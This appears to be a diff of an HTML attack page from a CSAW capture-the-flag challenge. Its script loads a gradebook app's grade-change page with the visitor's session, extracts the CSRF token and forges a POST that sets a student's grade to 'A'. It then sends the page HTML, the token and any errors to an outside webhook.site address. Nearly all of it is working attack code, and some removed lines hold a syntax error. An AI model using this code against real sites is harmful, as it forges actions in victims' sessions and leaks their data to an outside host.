@@ -1,65 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Grade Change Debug</title>
-</head>
 <body>
     <script>
-        const webhookUrl = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb';
-        
-        // Send debug message to webhook using GET (img tag)
-        function sendDebug(message, data = null) {
-            const debugData = {
-                timestamp: new Date().toISOString(),
-                message: message,
-                data: data
-            };
-            
-            // Encode data in URL parameters
-            const params = new URLSearchParams();
-            params.append('data', JSON.stringify(debugData));
-            
-            // Use img tag to avoid CORS
-            const img = new Image();
-            img.src = `${webhookUrl}?${params.toString()}`;
-        }
-
-        sendDebug('Script started execution');
-
         // First, fetch the grade-change page to get the CSRF token
-        sendDebug('Attempting to fetch CSRF token from /grade-change');
-        
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
             credentials: 'include'
         })
-        .then(response => {
-            sendDebug('Received response for CSRF token fetch', {
-                status: response.status,
-                statusText: response.statusText,
-                url: response.url
-            });
-            return response.text();
-        })
+        .then(response => response.text())
         .then(html => {
-            sendDebug('Successfully received HTML response for CSRF token');
-            
             // Parse the HTML to extract the CSRF token
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
             const csrfInput = doc.querySelector('input[name="csrf_token"]');
             
             if (!csrfInput) {
-                sendDebug('CSRF token input not found in HTML', {
-                    htmlSnippet: html.substring(, 500) // First 500 chars
+                // Send the entire HTML to webhook for debugging
+                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'csrf_token_not_found',
+                        full_html: html,
+                        message: 'CSRF token input not found in the GET response'
+                    })
                 });
-                throw new Error('CSRF token input not found');
+                return;
             }
             
             const csrfToken = csrfInput.value;
-            sendDebug('CSRF token extracted successfully', {
-                csrfToken: csrfToken
-            });
-
+            
             // Prepare the POST data
             const formData = new FormData();
             formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
@@ -67,37 +38,60 @@
             formData.append('grade', 'A');
             formData.append('csrf_token', csrfToken);
 
-            sendDebug('Attempting POST request to /grade-change', {
-                student_id: 'cec61aee-395d-4281-af96-cfe05bda466e',
-                class_id: 'e522382b-7643-469c-ae52-ba488f5752c6',
-                grade: 'A',
-                csrfToken: csrfToken
-            });
-
-            // Now, submit the POST request with the token
-            return fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
+            // Send POST request to grade-change
+            fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                 method: 'POST',
                 body: formData,
                 credentials: 'include'
-            });
-        })
-        .then(response => {
-            sendDebug('Received response from POST to /grade-change', {
-                status: response.status,
-                statusText: response.statusText
-            });
-            return response.text();
-        })
-        .then(result => {
-            sendDebug('POST request completed successfully', {
-                responseLength: result.length,
-                responseSnippet: result.substring(, 500)
+            })
+            .then(response => response.text())
+            .then(postResponseHtml => {
+                // Send the entire POST response HTML to webhook
+                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'post_response',
+                        full_html: postResponseHtml,
+                        csrf_token_used: csrfToken,
+                        post_data: {
+                            student_id: 'cec61aee-395d-4281-af96-cfe05bda466e',
+                            class_id: 'e522382b-7643-469c-ae52-ba488f5752c6',
+                            grade: 'A'
+                        },
+                        message: 'POST request completed'
+                    })
+                });
+            })
+            .catch(error => {
+                // Send error to webhook
+                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'post_error',
+                        error: error.toString(),
+                        message: 'POST request failed'
+                    })
+                });
             });
         })
         .catch(error => {
-            sendDebug('Error occurred during grade change attempt', {
-                error: error.toString(),
-                errorName: error.name
+            // Send error to webhook
+            fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    type: 'get_error',
+                    error: error.toString(),
+                    message: 'GET request for CSRF token failed'
+                })
             });
         });
     </script>
